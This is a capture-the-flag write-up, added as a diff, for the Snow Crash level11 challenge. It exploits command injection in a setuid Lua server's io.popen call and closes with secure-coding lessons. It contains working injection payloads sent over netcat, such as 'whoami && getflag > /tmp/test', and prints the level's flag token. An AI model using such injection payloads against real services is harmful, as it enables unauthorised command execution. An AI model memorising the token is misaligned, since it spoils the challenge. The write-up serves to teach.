@@ -1,0 +1,239 @@
+Snow Crash – Level11 Writeup (Pro Baby Guide)
+
+
+Objective
+
+Exploit a Lua server running as flag11 by abusing insecure command execution to execute arbitrary commands and retrieve the flag.
+
+This level teaches:
+
+Command injection
+
+Unsafe shell concatenation
+
+Network service exploitation
+
+Privilege escalation through server abuse
+
+
+Step 1 – Initial Enumeration
+
+List files:
+
+ls -l
+
+Output:
+
+-rwsr-sr-x 1 flag11 level11 668 level11.lua
+Important Observations
+    Setuid
+-rwsr-sr-x
+
+The s means:
+
+The script runs as flag11.
+
+That’s powerful.
+
+It’s a Lua Script
+
+Open it:
+
+cat level11.lua
+
+Key parts:
+
+local socket = require("socket")
+local server = assert(socket.bind("127.0.0.1", 5151))
+
+It binds a local server on:
+
+127.0.0.1:5151
+
+So this is a local network service.
+
+Step 2 – Understand The Vulnerable Code
+
+The dangerous function:
+
+function hash(pass)
+  prog = io.popen("echo "..pass.." | sha1sum", "r")
+
+This is the vulnerability.
+
+It concatenates user input directly into a shell command:
+
+echo <user_input> | sha1sum
+
+There is no sanitization.
+
+That means:
+
+If we inject shell operators, they will execute.
+
+Classic command injection.
+
+Step 3 – Interact With The Server
+
+Connect using netcat:
+
+nc localhost 5151
+
+It prompts:
+
+Password:
+
+Now whatever we type becomes pass.
+
+Why It’s Vulnerable
+
+Internally it runs:
+
+echo <our_input> | sha1sum
+
+If we send:
+
+whoami
+
+It executes:
+
+echo whoami | sha1sum
+
+No harm.
+
+But what if we send:
+
+whoami && id
+
+Now it becomes:
+
+echo whoami && id | sha1sum
+
+The shell interprets &&.
+
+That’s command injection.
+
+Step 4 – Test Injection
+
+Connect:
+
+nc localhost 5151
+
+Try:
+
+whoami > /tmp/test
+
+Check file:
+
+cat /tmp/test
+
+You’ll see:
+
+whoami
+
+That means redirection worked.
+
+Shell injection confirmed.
+
+Step 5 – Confirm Privilege Level
+
+Now try:
+
+whoami && whoami > /tmp/test
+
+Check file:
+
+cat /tmp/test
+
+You’ll see:
+
+flag11
+
+That proves:
+
+The injected command runs as flag11.
+
+This is privilege escalation.
+
+
+Step 6 – Execute getflag
+
+Now we escalate fully:
+
+Connect again:
+
+nc localhost 5151
+
+Send:
+
+whoami && getflag > /tmp/test
+
+Then:
+
+cat /tmp/test
+
+Output:
+
+Check flag.Here is your token : fa6v5ateaw21peobuub8ipe6s
+
+Level completed.
+
+Why This Works
+
+The vulnerability is here:
+
+io.popen("echo "..pass.." | sha1sum", "r")
+
+This builds a shell command by concatenation.
+
+Because it does not escape or sanitize pass, the shell interprets:
+
+&&
+
+;
+
+|
+
+>
+
+$()
+
+backticks
+
+This is textbook command injection.
+
+Real-World Relevance
+
+This exact vulnerability appears in:
+
+Web backends
+
+CGI scripts
+
+API wrappers
+
+Automation tools
+
+Admin dashboards
+
+If user input reaches:
+
+system()
+popen()
+exec()
+shell_exec()
+
+without sanitization → full compromise.
+
+Security Lessons
+- Never concatenate user input into shell commands
+
+Use safe APIs.
+
+- Always sanitize input
+
+Escape shell characters.
+
+- Least privilege principle
+
+Even if injection exists, running as root or privileged user makes it catastrophic.
